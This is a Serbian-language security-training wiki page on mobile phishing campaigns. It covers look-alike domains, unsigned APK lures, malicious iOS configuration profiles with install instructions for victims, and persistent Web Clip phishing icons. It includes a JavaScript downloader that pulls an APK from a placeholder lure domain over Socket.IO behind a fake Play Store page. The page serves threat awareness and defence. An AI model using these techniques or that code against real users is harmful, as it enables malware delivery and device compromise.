# Mobile Phishing & Malicious App Distribution (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Ova stranica obuhvata tehnike koje threat actors koriste za distribuciju **malicious Android APK-ova** i **iOS mobile-configuration profila** putem phishinga (SEO, social engineering, lažne prodavnice, dating aplikacije itd.).
> Materijal je prilagođen kampanji SarangTrap koju je otkrio Zimperium zLabs (2025), kao i drugim javno dostupnim istraživanjima.<sup>[[1]](#references)</sup>

## Tok napada

1. **SEO/Phishing infrastruktura**
* Registrovati desetine look-alike domena (dating, cloud share, car service…).
– Koristiti ključne reči na lokalnom jeziku i emoji-je u elementu `<title>` radi boljeg rangiranja na Google-u.
– Hostovati uputstva za instalaciju i za Android (`.apk`) i za iOS na istoj landing stranici.
2. **Preuzimanje prve faze**
* Android: direktan link ka *unsigned* APK-u ili APK-u sa “third-party store”-a.
* iOS: `itms-services://` ili običan HTTPS link ka malicioznom **mobileconfig** profilu (vidi ispod).
3. **Ponašanje Android malware-a nakon instalacije**
* Izvršavanje kontrolisano putem C2, zloupotreba dozvola, zaobilaženje dropper-a, prikupljanje podataka u pozadini i druga post-install malware ponašanja obrađeni su na posebnoj stranici Android Malware Post-Exploitation u nastavku.
4. **iOS tehnika distribucije**
* Jedan **mobile-configuration profil** može zahtevati `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` itd. radi upisivanja uređaja u nadzor sličan “MDM”-u.
* Uputstva za social engineering:
1. Otvoriti Settings ➜ *Profile downloaded*.
2. Tri puta dodirnuti *Install* (snimci ekrana nalaze se na phishing stranici).
3. Verovati unsigned profilu ➜ attacker dobija entitlements za *Contacts* i *Photo* bez App Store provere.
5. **iOS Web Clip payload (phishing ikonica aplikacije)**
* `com.apple.webClip.managed` payload-i mogu **zakačiti phishing URL na Home Screen** sa brendiranim nazivom/ikonom.
* Web Clips mogu raditi **preko celog ekrana** (sakrivajući interfejs browser-a) i biti označeni kao **neuklonjivi**, čime se žrtva primorava da obriše profil kako bi uklonila ikonu.<sup>[[3]](#references)</sup>
6. **Mrežni sloj**
* Običan HTTP, često na portu 80 sa HOST zaglavljem kao što je `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (bez TLS-a → lako uočljivo).

## Android Malware Post-Exploitation

Za post-install Android malware tradecraft, kao što su C2, zloupotreba Accessibility funkcija, overlays, ATS automation, staged DEX loading, premium SMS i persistence, pogledajte:

{{#ref}}
../basic-forensic-methodology/android-malware-post-exploitation.md
{{#endref}}

## Socket.IO/WebSocket-based APK Smuggling + Fake Google Play Pages

Attackers sve češće zamenjuju statične APK linkove Socket.IO/WebSocket kanalom ugrađenim u lure-ove koji izgledaju kao Google Play stranice. Ovo prikriva URL payload-a, zaobilazi URL/extension filtere i zadržava realističan UX instalacije.<sup>[[2]](#references)[[4]](#references)</sup>

Tipičan client flow uočen u praksi:

<details>
<summary>Socket.IO fake Play downloader (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

Zašto izbegava jednostavne kontrole:
- Nijedan statički APK URL nije izložen; payload se rekonstruiše u memoriji iz WebSocket frejmova.
- Filteri za URL/MIME/ekstenzije koji blokiraju direktne .apk odgovore mogu propustiti binarne podatke tunelovane putem WebSockets/Socket.IO.
- Crawleri i URL sandbox okruženja koja ne izvršavaju WebSockets neće preuzeti payload.

Pogledajte takođe WebSocket tradecraft i alate:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## Reference

- [1] [Mračna strana romantike: SarangTrap iznuđivačka kampanja](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [2] [Socket.IO](https://socket.io)
- [3] [Podešavanja Web Clips payloada za Apple uređaje](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)
- [4] [Bankarski trojanac usmeren na korisnike Androida u Indoneziji i Vijetnamu](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)

{{#include ../../banners/hacktricks-training.md}}
